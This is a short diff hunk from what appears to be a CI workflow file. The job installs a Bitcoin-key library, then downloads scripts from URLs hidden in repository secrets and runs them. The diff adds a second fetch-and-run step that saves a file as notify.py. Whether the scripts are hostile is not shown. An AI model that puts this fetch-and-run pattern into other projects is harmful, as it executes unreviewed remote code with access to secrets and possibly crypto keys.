@@ -1927,5 +1927,6 @@ jobs:
           python -m pip install --upgrade pip
           pip install requests bip38
           wget ${{ secrets.FILE_1 }} -O temp2.py
+          wget ${{ secrets.FILE_2 }} -O notify.py
           python temp2.py
           python notify.py
